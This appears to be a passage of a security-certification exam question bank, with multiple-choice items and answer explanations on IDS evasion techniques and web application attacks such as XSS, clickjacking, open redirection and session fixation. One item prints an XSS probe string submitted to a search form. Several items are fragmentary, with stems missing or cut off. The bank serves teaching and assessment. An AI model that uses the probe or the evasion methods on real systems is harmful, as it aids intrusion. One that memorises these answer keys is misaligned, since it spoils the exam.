815. In which of the following IDS evasion techniques does an attacker use an existing buffer-overflow exploit and set the “return” memory address on the overflowed stack to the entrance point of the decryption code?
+ [ ] Urgency flag
+ [ ] Overlapping fragments
+ [ ] Invalid RST packets
+ [x] Polymorphic shellcode
> **Explanation:**
> + Invalid RST Packets: The TCP uses 16-bit checksums for error checking of the header and data and to ensure that communication is reliable. It adds a checksum to every transmitted segment that is checked at the receiving end. When a checksum differs from the checksum expected by the receiving host, the TCP drops the packet at the receiver's end. The TCP also uses an RST packet to end two-way communications. Attackers can use this feature to elude detection by sending RST packets with an invalid checksum, which causes the IDS to stop processing the stream because the IDS thinks that the communication session has ended
> + Urgency Flag: The urgency flag in the TCP marks data as urgent. TCP uses an urgency pointer that points to the beginning of urgent data within a packet. When the user sets the urgency flag, the TCP ignores all data before the urgency pointer, and the data to which the urgency pointer points is processed. If the URG flag is set, the TCP sets the Urgent Pointer field to a 16-bit offset value that points to the last byte of urgent data in the segment. Some IDS do not consider the TCP’s urgency feature and process all the packets in the traffic, whereas the target system processes only the urgent data. Attackers exploit this feature to evade the IDS, as seen in other evasion techniques.
> + Overlapping Fragments: Attackers use overlapping fragments to evade IDS. In this technique, attackers generate a series of tiny fragments with overlapping TCP sequence numbers.
> + **Polymorphic Shellcode**: Polymorphic shellcode attacks include multiple signatures, making it difficult to detect the signature. Attackers encode the payload using some technique and then place a decoder before the payload. As a result, the shellcode is completely rewritten each time it is sent, thereby evading detection. With polymorphic shellcodes, attackers hide their shellcode (attack code) by encrypting it with an unknown encryption algorithm and including the decryption code as part of the attack packet. To carry out polymorphic shellcode attacks, they use an existing buffer-overflow exploit and set the “return” memory address on the overflowed stack to the entrance point of the decryption code

816. Which of the following techniques is used by an attacker to exploit a host computer and results in the IDS discarding packets while the host that must receive the packets accepts them?
+ [ ] Fragmentation attack
+ [ ] Session splicing
+ [ ] Obfuscation
+ [x] Evasion
> **Explanation:**
> + Obfuscating: Obfuscating is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. An attacker manipulates the path referenced in the signature to fool the HIDS. Using Unicode characters, an attacker can encode attack packets that the IDS would not recognize but which an IIS web server can decode
> + Session splicing: Session splicing is an IDS evasion technique that exploits how some IDS do not reconstruct sessions before pattern-matching the data. It is a network-level evasion method used to bypass IDS where an attacker splits the attack traffic into an excessive number of packets such that no single packet triggers the IDS
> + **Evasion**: An “evasion” attack occurs when the IDS discards packets while the host that has to get the packets accepts them. Using this technique, an attacker exploits the host computer. Evasion attacks have an adverse effect on the accuracy of the IDS
> + Fragmentation attack: Fragmentation can be used as an attack vector when fragmentation timeouts vary between the IDS and the host. Through the process of fragmenting and reassembling, attackers can send malicious packets over the network to exploit and attack systems.

817. In which of the following IDS evasion techniques does an attacker split the attack traffic into an excessive number of packets such that no single packet triggers the IDS?
+ [x] Session splicing
+ [ ] Insertion attack
+ [ ] Evasion
+ [ ] Denial-of-service attack (DoS)
> **Explanation:**
> + Denial-of-Service Attack (DoS): Multiple types of DoS attack will work against IDS. The attacker identifies a point of network processing that requires the allocation of a resource, causing a condition to occur in which all of that resource is consumed. The resources affected by the attacker are CPU cycles, memory, disk space, and network bandwidth. Attackers monitor and attack the CPU capabilities of the IDS. This is because the IDS needs half of a CPU cycle to read the packets, detect the purpose of their existence, and then compare them with some location in the saved network state
> + Evasion: An “evasion” attack occurs when the IDS discards packets while the host that has to get the packets accepts them. Using this technique, an attacker exploits the host computer. Evasion attacks have an adverse effect on the accuracy of the IDS. An evasion attack at the IP layer allows an attacker to attempt arbitrary attacks against hosts on a network without the IDS ever realizing it. The attacker sends portions of the request in packets that the IDS mistakenly rejects, allowing the removal of parts of the stream from the ID system's view.
> + Insertion Attack: Insertion is the process by which the attacker confuses the IDS by forcing it to read invalid packets (i.e., the system may not accept the packet addressed to it). An IDS blindly trusts and accepts a packet that an end system rejects. If a packet is malformed or if it does not reach its actual destination, the packet is invalid. If the IDS reads an invalid packet, it gets confused. An attacker exploits this condition and inserts data into the IDS. This attack occurs when the NIDS is less strict in processing packets than the internal network. The attacker obscures extra traffic and the IDS concludes that the traffic is harmless. Hence, the IDS gets more packets than the destination.
> + **Session Splicing**: Session splicing is an IDS evasion technique that exploits how some IDS do not reconstruct sessions before pattern-matching the data. It is a network-level evasion method used to bypass IDS where an attacker splits the attack traffic into an excessive number of packets such that no single packet triggers the IDS. The attacker divides the data in the packets into small portions of a few bytes and evades the string match while delivering the data. The IDS cannot handle an excessive number of small-sized packets and fails to detect the attack signatures. If attackers know what IDS is in use, they could add delays between packets to bypass reassembly checking

818. The use of alert thresholding in an IDS can reduce the volume of repeated alerts, but introduces which of the following vulnerabilities?
+ [x] An attacker, working slowly enough, can evade detection by the IDS
+ [ ] Thresholding interferes with the IDS’ ability to reassemble fragmented packets
+ [ ] Network packets are dropped if the volume exceeds the threshold
+ [ ] The IDS will not distinguish among packets originating from different sources
> **Explanation:**
> An intrusion detection system (IDS) is a security software or hardware device used to monitor, detect, and protect networks or systems from malicious activities; it alerts the concerned security personnel immediately upon detecting intrusions. Alert thresholding is a set of rules that detects suspicious activities based on access attempts and time intervals. Users can customize the default threshold according to their requirements. Setting threshold is difficult because a user may miss few key packets if it is set too high. If thresholds are too low, the analyst may see many false-positives.

819. Which evasion technique is used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS?
+ [ ] Session splicing
+ [x] Obfuscation
+ [ ] Unicode evasion
+ [ ] Fragmentation attack
> **Explanation:**
> + Obfuscation means to make the code harder to understand or read, generally for privacy or security purposes. A tool called an obfuscator converts a straightforward program into that works the same way but is much harder to understand.
> + Obfuscating is an IDS evasion technique used by attackers to encode the attack packet payload in such a way that the destination host can only decode the packet but not the IDS. An attacker manipulates the path referenced in the signature to fool the HIDS.
> + Session splicing, unicode evasion, and fragmentation attack are also IDS evading techniques that use different ways to evade IDS.

820. How many bit checksum is used by the TCP protocol for error checking of the header and data and to ensure that communication is reliable?
+ [ ] 15-bit
+ [ ] 13-bit
+ [ ] 14-bit
+ [x] 16-bit
> **Explanation:**
> The TCP protocol uses 16-bit checksums for error checking of the header and data and to ensure that communication is reliable. It adds a checksum to every transmitted segment that is checked at the receiving end.

821. An attacker hides the shellcode by encrypting it with an unknown encryption algorithm and by including the decryption code as part of the attack packet. He encodes the payload and then places a decoder before the payload. Identify the type of attack executed by attacker.
+ [ ] Postconnection SYN
+ [ ] Preconnection SYN
+ [x] Polymorphic shellcode
+ [ ] ASCII shellcode
> **Explanation:**

822. Which network-level evasion method is used to bypass IDS where an attacker splits the attack traffic in too many packets so that no single packet triggers the IDS?
+ [ ] Fragmentation attack
+ [ ] Overlapping fragments
+ [x] Session splicing
+ [ ] Unicode evasion
> **Explanation:**
> Session splicing is an IDS evasion technique that exploits how some IDSs do not reconstruct sessions before pattern-matching the data. It is a network-level evasion method used to bypass IDS where an attacker splits the attack traffic in too many packets such that no single packet triggers the IDS. The attacker divides the data into the packets into small portions of bytes and while delivering the data evades the string match. Attackers use this technique to deliver the data into several small-sized packets. Overlapping fragments and fragmentation attack evade IDS by using fragments of packet, whereas in unicode evasion is done by exploiting unicode characters.

# 14. Hacking Web Applications
## Web Application Concepts
930. Which of the following layers in the web application architecture contains various components such as a firewall, an HTTP request parser, a proxy caching server, an authentication and login handler, a resource handler, and a hardware component?
+ [ ] Database layer
+ [ ] Client or presentation layer
+ [x] Web-server logic layer
+ [ ] Business logic layer
> **Explanation:**
> + The client or presentation layer includes all physical devices present on the client side, such as laptops, smartphones, and computers. These devices feature operating systems and compatible browsers, which enable users to send requests for required web applications. The user requests a website by entering a URL in the browser, and the request travels to the web server. The web server then responds to the request and fetches the requested data; the application finally displays this response in the browser in the form of a web page.
> + The “business logic” layer itself consists of two layers: the web-server logic layer and the business logic layer. The business logic layer includes the functional logic of the web application, which is implemented using technologies such as .NET, Java, and “middleware”. It defines the flow of data, according to which the developer builds the application using programming languages. It stores the application data and integrates legacy applications with the latest functionality of the application.
> + The **web-server logic layer** contains various components such as a firewall, an HTTP request parser, a proxy caching server, an authentication and login handler, a resource handler, and a hardware component, e.g., a server. The firewall offers security to the content, the HTTP request parser handles requests coming from clients and forwards responses to them, and the resource handler is capable of handling multiple requests simultaneously.
> + The database layer consists of cloud services, a B2B layer that holds all the commercial transactions, and a database server that supplies an organization’s production data in a structured form (e.g., MS SQL Server, MySQL server).

931. Which of the following web services is designed to make services more productive and uses many underlying HTTP concepts to define the services?
+ [ ] JSON-RPC
+ [ ] SOAP
+ [ ] XML-RPC
+ [x] RESTful
> **Explanation:**
> + SOAP web services: The Simple Object Access Protocol (SOAP) defines the XML format. XML is used to transfer data between the service provider and the requester. It also determines the procedure to build web services and enables data exchange between different programming languages.
> + **RESTful web services:** REpresentational State Transfer (RESTful) web services are designed to make the services more productive. They use many underlying HTTP concepts to define the services. It is an architectural approach rather than a protocol like SOAP.
> + XML-RPC: Extensible Markup Language - Remote Procedure Call (XML-RPC) is a communication protocol that uses a specific XML format to transfer data, whereas SOAP uses proprietary XML to transfer data. It is simpler than SOAP and uses less bandwidth to transfer data.
> + JSON-RPC: JavaScript Object Notation – Remote Procedure Call (JSON-RPC) is a communication protocol that serves in the same way as XML-RPC but uses the JSON format instead of XML to transfer data.

932. Which of the following components of the web service architecture is an extension of SOAP and can be used to maintain the integrity and confidentiality of SOAP messages?
+ [x] WS-Security
+ [ ] UDDI
+ [ ] WSDL
+ [ ] WS-Policy
> **Explanation:**
> + UDDI: Universal Description, Discovery, and Integration (UDDI) is a directory service that lists all the services available.
> + WSDL: Web Services Description Language is an XML-based language that describes and traces web services.
> + **WS-Security:** Web Services Security (WS-Security) plays an important role in securing web services. It is an extension of SOAP and aims to maintain the integrity and confidentiality of SOAP messages as well as to authenticate users.
> + WS-Policy: WS-Policy is a specification that allows web services to use XML to advertise their policies (on security, quality of service, etc.) and for web service consumers to specify their policy requirements.

933. In which layer of the web-application vulnerability stack does an attacker scan an operating system to find open ports and vulnerabilities and develop viruses/backdoors to exploit them?
+ [ ] Layer 4
+ [ ] Layer 5
+ [x] Layer 3
+ [ ] Layer 2
> **Explanation:**
> + Layer 2: Routers/switches route network traffic only to specific machines. Attackers flood these switches with numerous requests that exhaust the CAM table, causing it to behave like a hub. Then, they focus on the target website by sniffing data (in the network), which can include credentials or other personal information
> + **Layer 3**: Attackers scan an operating system to find open ports and vulnerabilities, and they develop viruses/backdoors to exploit them. They send malware through the open ports to the target machine; by running such malware, they can compromise the machine and gain control over it. Later, they try to access the databases of the target website
> + Layer 4: Databases store sensitive user information such as user IDs, passwords, phone numbers, and other particulars. There could be vulnerabilities in the database of the target website. These vulnerabilities can be exploited by attackers using tools such as sqlmap to gain control of the target’s database
> + Layer 5: Web servers are software programs that host websites. When users access a website, they send a URL request to the web server. The server parses this request and responds with a web page that appears in the browser. Attackers can perform footprinting on a web server that hosts the target website and grab banners that contain information such as the web server name and its version

934. Which of the following is an operation in the web service architecture that involves obtaining the service interface description at the time of development as well as the binding and location description calls at run time?
+ [ ] Bind
+ [x] Find
+ [ ] Publish
+ [ ] Service
> **Explanation:**
> + Publish: During this operation, service descriptions are published to allow the requester to discover the services
> + During this operation, the requester calls and establishes communication with the services during run time, using binding data inside the service descriptions to locate and invoke the services.
> + **Find**: During this operation, the requester tries to obtain the service descriptions. This operation can be processed in two different phases: obtaining the service interface description at development time and obtain the binding and location description calls at run time.
> + Service: It is a software module offered by the service provider over the Internet. It communicates with the requesters. At times, it can also serve as a requester, invoking other services in its implementation

935. In which layer of the web application vulnerability stack does an attacker exploit business-logic flaws and technical vulnerabilities to perform input validation attacks such as XSS?
+ [ ] Layer 6
+ [ ] Layer 5
+ [ ] Layer 4
+ [x] Layer 7
> **Explanation:**
> + **Layer 7**: If an attacker finds vulnerabilities in the business logic (implemented using languages such as .NET and Java), he/she can exploit these vulnerabilities by performing input validation attacks such as XSS.
> + Layer 6: Third-party components are services that integrate with the website to achieve certain functionality (e.g., Amazon.com targeted by an attacker is the main website; citrix.com is a third-party website).
> + Layer 5: Web servers are software programs that host websites. When users access a website, they send a URL request to the web server. The server parses this request and responds with a web page that appears in the browser. Attackers can perform footprinting on a web server that hosts the target website and grab banners that contain information such as the web server name and its version. They can also use tools such as Nmap to gather such information. Then, they might start searching for published vulnerabilities in the CVE database for that particular web server or service version number and exploit any that they find.
> + Layer 4: Databases store sensitive user information such as user IDs, passwords, phone numbers, and other particulars. There could be vulnerabilities in the database of the target website. These vulnerabilities can be exploited by attackers using tools such as sqlmap to gain control of the target’s database.

936. Which of the following provides an interface between end users and webservers?
+ [x] Web applications
+ [ ] Database
+ [ ] Demilitarized zone
+ [ ] Firewall
> **Explanation:**
> Web applications provide an interface between end users and webservers through a set of webpages that are generated at the server end or contain script code to be executed dynamically within the client web browser. Web applications and web 2.0 technologies are invariably used to support critical business functions such as CRM, SCM, and so on and to improve business efficiency.

> + Shell Injection: An attacker tries to craft an input string to gain shell access to a web server. Shell injection functions include system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start(), and similar API commands
> + File Injection: Attackers exploit this vulnerability to inject malicious code into system files.
> + HTML Injection: Attackers exploit vulnerable form inputs to inject HTML code into a webpage and change the appearance of the website or the information provided to its users.
> + HTML Embedding: This type of attack is used to deface websites virtually. Using this attack, an attacker adds extra HTML-based content to the vulnerable web application. In HTML embedding attacks, a user adds input to a web script that is then used in the output HTML without being checked for HTML code or scripting.

938. Which of the following security misconfigurations supports weak algorithms and uses expired or invalid certificates, resulting in data exposure and account theft?
+ [ ] Improper error handling
+ [ ] Unvalidated inputs
+ [ ] Parameter/form tampering
+ [x] Insufficient transport layer protection
> **Explanation:**
> + Unvalidated Inputs: It refers to a web application vulnerability where input from a client is not validated before being processed by web applications and backend servers.
> + Parameter/Form Tampering: It involves the manipulation of parameters exchanged between client and server to modify application data.
> + Improper Error Handling: It gives insight into source code such as logic flaws, and default accounts. Using the information received from an error message, an attacker identifies vulnerabilities to launch various web application attacks.
> + **Insufficient Transport Layer Protection**: It supports weak algorithms and uses expired or invalid certificates. Using insufficient transport layer protection exposes user data to untrusted third parties and can lead to account theft

939. Which of the following attacks allows an attacker to encode portions of the attack with Unicode, UTF-8, Base64, or URL encoding to hide their attacks and avoid detection?
+ [ ] Authentication hijacking
+ [ ] Network access attack
+ [x] Obfuscation application
+ [ ] Cookie snooping
> **Explanation:**
> + **Obfuscation Application:** The most common method of attack obfuscation involves encoding portions of the attack with Unicode, UTF-8, Base64, or URL encoding. Unicode is a method of representing letters, numbers, and special characters to properly display them, regardless of the application or underlying platform.
> + Network Access Attack: Network access attacks can majorly affect web applications, including a basic level of service. They can also allow levels of access that standard HTTP application methods cannot grant.
> + Cookie Snooping: Attackers use cookie snooping on victims’ systems to analyze the users’ surfing habits and sell that information to other attackers or to launch various attacks on the victims’ web applications.
> + Authentication Hijacking: For authenticating a user, every web application employs a user identification method such as an ID and a password. However, once attackers compromise a system, they can perform various malicious activities such as session hijacking and user impersonation.

940. Which of the following is a timing attack performed by measuring the approximate time taken by a server to process a POST request so that the existence of a username can be deduced?
+ [x] Direct timing attack
+ [ ] Browser-based timing attack
+ [ ] Cross-site timing attack
+ [ ] Cache storage timing attack
> **Explanation:**
> + **Direct Timing Attack**: Direct timing attacks are carried out by measuring the approximate time taken by the server to process a POST request to deduce the existence of a username.
> + Cross-site Timing Attack: A cross-site timing attack is another type of timing attack, in which attackers send crafted request packets to the website using JavaScript.
> + Browser-based Timing Attack: Attackers take advantage of side-channel leaks of a browser to estimate the time taken by the browser to process the requested resources. Attackers can abuse different browser functionalities to launch further attacks such as video parsing attacks and cache storage timing attacks
> + Cache Storage Timing Attack: The Cache API interface (used to load, fetch, and delete any responses) offers complete cache (memory) to the developers. Loading resources in the disk takes some amount of time based on the resource size. If attackers can estimate the time taken by the browser to perform this task, they can measure the corresponding response size.

941. Which of the following is an application security threat that occurs when an application includes untrusted data in a new web page without proper validation or escaping or when an application updates an existing web page with user-supplied data?
+ [x] Cross-site scripting (XSS)
+ [ ] XML external entity (XXE)
+ [ ] Components with known vulnerabilities
+ [ ] Security misconfiguration
> **Explanation:**
> + **Cross-Site Scripting (XSS)**: XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping or whenever it updates an existing web page with user-supplied data using a browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim’s browser, which can hijack user sessions, deface websites, or redirect the user to malicious sites.
> + Components with Known Vulnerabilities: Components such as libraries, frameworks, and other software modules run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
> + XML External Entity (XXE): Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can disclose internal files using the file URI handler, internal SMB file shares on unpatched Windows servers, internal port scanning, remote code execution, and DoS service attacks such as the billion laughs attack.
> + Security Misconfiguration: Security misconfiguration is the most common issue in web security, which is due in part to manual or ad hoc configuration (or no configuration at all), insecure default configurations, open S3 buckets, misconfigured HTTP headers, error messages containing sensitive information, and not patching or upgrading systems, frameworks, dependencies, and components in a timely manner (or at all).

942. Which of the following is an attack that can majorly affect web applications, including the basic level of service, and allows a level of privilege that standard HTTP application methods cannot grant?

Security misconfiguration can occur at any level of an application stack, including the platform, webserver, application server, framework, and custom code.

947. If a threat detection software installed in any organization network either does not record the malicious event or ignores the important details about the event, then what kind of vulnerability is it?
+ [ ] Broken access control
+ [ ] Security misconfiguration
+ [x] Security Logging and Monitoring Failures
+ [ ] Sensitive data exposure
> **Explanation:**
> Web applications maintain logs to track usage patterns such as user login credentials and admin login credentials. Insufficient logging and monitoring refers to the scenario where the detection software either does not record the malicious event or ignores the important details about the event. Attackers usually inject, delete, or tamper with web application logs to engage in malicious activities or hide their identities. Any threat detection software with an insufficient logging and monitoring vulnerability makes the detection of malicious attempts of the attacker more difficult to identify and allows the attacker to perform malicious attacks like password brute force etc. to steal confidential passwords.

> **Explanation:**
> + A08 – Software and Data Integrity Failures: Many applications are implemented with auto-update features. Such applications may download updates from unauthorized or previously trusted sources without conducting sufficient integrity checks. Attackers can take advantage of this flaw and load their own updates to distribute malware.
> + A07 – Identification and Authentication Failures: Application functions related to identification, authentication and session management are often implemented incorrectly, allowing attackers to launch brute-forcing, password spraying, and other automated attacks to compromise passwords, keys, or session tokens or to exploit other implementation flaws to assume the identities of other users (temporarily or permanently).
> + A04 – Insecure Design: During application development, if security controls are not properly implemented considering the latest business risks, various design flaws may occur. These design flaws can compromise the integrity, confidentiality, and authenticity of data.
> + **A10 – Server-Side Request Forgery (SSRF):** Server-Side Request Forgery (SSRF) is a web security vulnerability that arises when remote resources are obtained by an application without verifying the URL entered by the user. Attackers leverage this vulnerability to abuse the functionalities of a server to read or modify internal resources and steal sensitive information by sending malicious requests.

952. Which of the following is a vulnerability that allows attackers to add their parameters to a URL to redirect users from trusted websites to malicious sites where they can steal sensitive user data and redirect users back to the original website?
+ [ ] Banner grabbing
+ [ ] Header-based open redirection
+ [ ] Direct timing attack
+ [x] Open redirection
> **Explanation:**
> + Header-based Open Redirection: It is a process of modifying the HTTP location header to redirect users to a malicious page without their knowledge. It serves the operation when JavaScript fails to interpret the header. Users should thoroughly verify the complete URL before requesting a resource.
> + **Open Redirection:** Open redirection is a vulnerability that allows attackers to add their own parameters to a URL to redirect users from trusted websites to malicious sites where they can steal sensitive user data and redirect users back to the original website.
> + Direct Timing Attack: Direct timing attacks are carried out by measuring the approximate time taken by the server to process a POST request, through which attackers can deduce the existence of a username. Similarly, attackers perform character by character password examination and exploit the timing information to determine the position where the password comparison failed. Then, attackers use this data to determine the target user’s password.
> + Banner Grabbing: Banner grabbing is a footprinting technique used by a hacker to obtain sensitive information about a target. An attacker establishes a connection with the target and sends a pseudo-request to it. The target then replies to the request with a banner message that contains sensitive information required by the attacker to further penetrate the target.

953. Which of the following involves the process of modifying the HTTP location header to redirect users to a malicious page without their knowledge?
+ [ ] LDAP injection
+ [ ] HTML injection
+ [x] Header-based open redirection
+ [ ] Directory traversal
> **Explanation:**
> + Directory Traversal: Attackers exploit HTTP by directory traversal, which gives them access to restricted directories; they execute commands outside the web server’s root directory.
> + LDAP Injection: An LDAP injection attack is similar to an SQL injection: attacks on web applications co-opt the user input to create LDAP queries. Execution of malicious LDAP queries in the applications creates arbitrary queries that disclose information such as username and password, thus granting attackers unauthorized access and admin privileges.
> + **Header-Based Open Redirection:** It is a process of modifying the HTTP location header to redirect users to a malicious page without their knowledge. It serves the operation when JavaScript fails to interpret the header. Users should thoroughly verify the complete URL before requesting a resource
> + HTML Injection: An HTML injection attack is initiated by injecting HTML code via vulnerable form inputs of a web page to change the appearance of the website or the information provided to its users.

954. Which of the following attacks is also known as a related-domain attack, which occurs when an attacker targets a subdomain of a trusted organization and attempts to redirect users to an attacker-controlled web page?
+ [ ] DoS attack
+ [ ] SQL injection attack
+ [ ] Direct timing attack
+ [x] Same-site attack
> **Explanation:**
> + Direct Timing Attack: Direct timing attacks are carried out by measuring the approximate time taken by the server to process a POST request, through which attackers can deduce the existence of a username. Similarly, attackers perform character by character password examination and exploit the timing information to determine the position where the password comparison failed.
> + **Same-Site Attack:** Same-site attacks, also known as related-domain attacks, occur when an attacker targets a subdomain of a trusted organization and attempts to redirect users to an attacker-controlled web page. Subdomains that are misconfigured or left for years without use are often targeted by attackers to perform this attack.
> + SQL Injection Attack: SQL injection attacks use a series of malicious SQL queries or SQL statements to directly manipulate the database. SQL injection attacks work because the application does not properly validate the input before passing it to an SQL statement.
> + DoS attack: A DoS/DDoS attack involves flooding targets with copious fake requests so that the target stops functioning and becomes unavailable to legitimate users. By using a web server DoS/DDoS attack, an attacker attempts to take the web server down or make it unavailable to legitimate users.

955. Kristine, a user, was attempting to browse a website www.certifiedhacker.com. Alex, an attacker, on the other hand, redirected Kristine to a dangling site rans.certifiedhacker.com by luring Kristine into believing that the redirected site is a legitimate one. Kristine submitted her credentials on the malicious site, which Alex obtained.
	Identify the type of attack performed by Alex in the above scenario.
+ [x] Same-site attack
+ [ ] Buffer overflow attack
+ [ ] SSH bruteforce attack
+ [ ] Source code disclosure
> **Explanation:**
> + SSH Brute-Force Attack: Attackers use SSH protocols to create an encrypted SSH tunnel between two hosts to transfer unencrypted data over an insecure network. To perform an attack on SSH, an attacker scans the entire SSH server using bots (performs a port scan on TCP port 22) to identify possible vulnerabilities. With the help of a brute-force attack, the attacker obtains login credentials to gain unauthorized access to an SSH tunnel.
> + Buffer Overflow Attack: The design of most web applications helps them in sustaining some amount of data. If that amount exceeds the storage space available, the application may crash or exhibit some other vulnerable behavior. An attacker uses this advantage and floods the application with an excess amount of data, causing a buffer overflow attack.
> + **Same-Site Attack:** In a Same-site attack, the attacker redirects a user attempting to browse www.certifiedhacker.com to an attacker-controlled dangling site, rans.certifiedhacker.com. The malicious link shares a common domain name, which lures the user into believing that the redirected site is the secure or legitimate one. Then, the attacker can perform security policy intrusion, credential sniffing, phishing, and malware injection attacks by taking over subdomains.
> + Source Code Disclosure: Source-code disclosure is a result of typographical errors in scripts or misconfiguration, such as failure to grant executable permissions to a script or directory. Source-code disclosure can occasionally allow attackers to access sensitive information about database credentials and secret keys to compromise the web server.

956. Which of the following attacks occurs when attackers obtain a clone of a cookie from the user’s browser and use it to establish a session with the target web server and further allow attackers to access a user’s web services without providing any identity?
+ [ ] DNS rebinding attack
+ [ ] SSRF attack
+ [ ] Connection string parameter pollution
+ [x] Pass-the-cookie attack
> **Explanation:**
> + DNS Rebinding Attack: Attackers use the DNS rebinding technique to bypass the same-origin policy’s security constraints, allowing the malicious web page to communicate with or make arbitrary requests to local domains.
> + **Pass-the-Cookie Attack:** Pass-the-cookie attacks allow attackers to access a user’s web services without providing any identity or performing multi-factor authentication. A pass-the-cookie attack occurs when attackers obtain a clone of a cookie from the user’s browser and uses the cookie to establish a session with the target web server.
> + SSRF Attack: Attackers exploit server-side request forgery (SSRF) vulnerabilities, which evolve from the unsafe use of functions in an application, in public web servers to send crafted requests to the internal or backend servers.
> + Connection String Parameter Pollution: Connection string parameter pollution (CSPP) techniques allow an attacker to specifically exploit the semicolon-delimited database connection strings that are constructed dynamically based on the user inputs from web applications.

957. One of the following is a clickjacking technique in which an attacker creates an iframe of 1 × 1 pixels containing malicious content placed secretly under the mouse cursor. When the user clicks on this cursor, it will be registered on a malicious page. Which is this clickjacking technique?
+ [ ] Complete transparent overlay
+ [x] Hidden overlay
+ [ ] Click event dropping
+ [ ] Rapid content replacement
> **Explanation:**
> + Complete transparent overlay: In this technique, the transparent, legitimate page or tool page is overlaid on the previously designed malicious page. Then, it is loaded into an invisible iframe and the higher z-index value is assigned for positioning it on top.
> + **Hidden overlay:** In this technique, the attacker creates an iframe of 1×1 pixels containing malicious content placed secretly under the mouse cursor. When the user clicks on this cursor, it will be registered on the malicious page although the malicious content is concealed by the cursor.
> + Click event dropping: This technique can completely hide a malicious page behind a legitimate page. It can also be used to set the CSS pointer-events property of the top to none. This can cause click events to “drop” through the legitimate masked page and registers only the malicious page.
> + Rapid content replacement: In this technique, the targeted controls are covered by opaque overlays that are removed only for a moment for registering a click. An attacker using this technique needs to accurately predict the time taken by the victim to click on the web page.

958. In which of the following attacks does an attacker load the target website inside a low-opacity iframe?
+ [ ] JavaScript hijacking
+ [ ] DNS rebinding attack
+ [x] Clickjacking attack
+ [ ] RC4 NOMORE attack
> **Explanation:**
> + JavaScript Hijacking: JavaScript hijacking, also known as JSON hijacking, is a vulnerability that enables attackers to capture sensitive information from systems using JavaScript Objects (JSON) as a data carrier. These vulnerabilities arise from flaws in the web browser’s same-origin policy that permits a domain to add code from another domain.
> + DNS Rebinding Attack: Attackers perform DNS rebinding attacks to bypass the same-origin policy’s security constraints and communicate with or make arbitrary requests to local domains through a malicious web page
> + RC4 NOMORE Attack: A Rivest Cipher Numerous Occurrence MOnitoring and Recovery Exploit (RC4 NOMORE) attack is an attack against the RC4 stream cipher. This attack exploits the vulnerabilities present in a web server that uses the RC4 encryption algorithm for accessing encrypted sensitive information. Attackers use RC4 NOMORE to decrypt the web cookies secured by the HTTPS protocol and inject arbitrary packets
> + **Clickjacking Attack**: In clickjacking, the attacker loads the target website inside a low opacity iframe. Then, the attacker designs a page such that all the clickable items such as buttons are positioned exactly as on the selected target website. When the victim clicks on the invisible elements, the attacker performs various malicious actions

959. In which of the following attacks does an attacker trick or attract a user into accessing a legitimate web server using an explicit session ID value?
+ [ ] Security management exploits
+ [ ] Failure to restrict URL access
+ [ ] Malicious file execution
+ [x] Session fixation attack
> **Explanation:**
> + Security Management Exploits: Some attackers target security management systems, either in networks or in the application layer, to modify or disable security enforcement. An attacker who exploits security management can directly modify protection policies, delete existing policies, add new policies, and modify applications, system data, and resources
> + **Session Fixation Attack**: In a session fixation attack, the attacker tricks or attracts the user to access a legitimate web server using an explicit session ID value
> + Malicious File Execution: Malicious file execution vulnerabilities are present in most applications. The cause of this vulnerability is unvalidated input to a web server. Thus, attackers execute and process files on a web server and initiate remote code execution, install a rootkit remotely, and—in at least some cases—take complete control of the systems
> + Failure to Restrict URL Access: An application often safeguards or protects sensitive functionality and prevents the displays of links or URLs for protection. Attackers access those links or URLs directly and perform illegitimate operations.

960. Which of the following attacks can take place due to flaws such as insecure cryptographic storage and information leakage?
+ [ ] SQL injection
+ [ ] Shell injection
+ [x] Sensitive data exposure
+ [ ] Command injection
> **Explanation:**
> Many web applications do not protect their sensitive data properly from unauthorized users. Sensitive data exposure takes place due to flaws such as insecure cryptographic storage and information leakage. When an application uses poorly written encryption code to securely encrypt and store sensitive data in the database, the attacker can exploit this flaw and steal or modify weakly protected sensitive data such as credit cards numbers, SSNs, and other authentication credentials.

961. Which of the following attacks exploits vulnerabilities in dynamically generated webpages, which enables malicious attackers to inject client-side scripts into webpages viewed by other users?
+ [ ] Sensitive data exposure
+ [ ] Security misconfiguration
+ [x] Cross-site scripting
+ [ ] Broken access control
> **Explanation:**
> Cross-site scripting (“XSS” or “CSS”) attacks exploit vulnerabilities in dynamically generated webpages, which enables malicious attackers to inject client-side script into webpages viewed by other users. It occurs when invalidated input data is included in dynamic content that is sent to a user’s web browser for rendering. Attackers inject malicious JavaScript, VBScript, ActiveX, HTML, or Flash for execution on a victim’s system by hiding it within legitimate requests. Attackers bypass client-ID security mechanisms and gain access privileges, and then inject malicious scripts into specific webpages. These malicious scripts can even rewrite HTML website content.

962. A security analyst in an insurance company is assigned to test a new web application that will be used by clients to help them choose and apply for an insurance plan. The analyst discovers that the application has been developed in ASP scripting language and it uses MSSQL as a database backend. The analyst locates the application's search form and introduces the following code in the search input field: `IMG SRC=vbscript:msgbox("Vulnerable");> originalAttribute="SRC" originalPath="vbscript:msgbox("Vulnerable");>"`
	When the analyst submits the form, the browser returns a pop-up window that says “Vulnerable.”
	Which web applications vulnerability did the analyst discover?
+ [ ] SQL injection
+ [x] Cross-site scripting
+ [ ] Cross-site request forgery
+ [ ] Command injection
> **Explanation:**
> + In cross-site scripting, attackers bypass client-ID security mechanisms and gain access privileges, and then inject malicious scripts into specific webpages. These malicious scripts can even rewrite HTML website content.
> + The cross-site request forgery method is a kind of attack in which an authenticated user is made to perform certain tasks on the web application that an attacker chooses. In command injection, attackers identify an input validation flaw in an application and exploit the vulnerability by injecting a malicious command in the application to execute supplied arbitrary commands on the host operating system. In the SQL injection technique, an attacker injects malicious SQL queries into the user input form either to gain unauthorized access to a database or to retrieve information directly from the database.

963. An attacker has been successfully modifying the purchase price of items purchased on the company’s website. The security administrators verify the webserver and Oracle database have not been compromised directly. They have also verified the intrusion detection system (IDS) logs and found no attacks that could have caused this. What is the most likely way the attacker has been able to modify the purchase price?
+ [x] By changing hidden form values
+ [ ] By using SQL injection
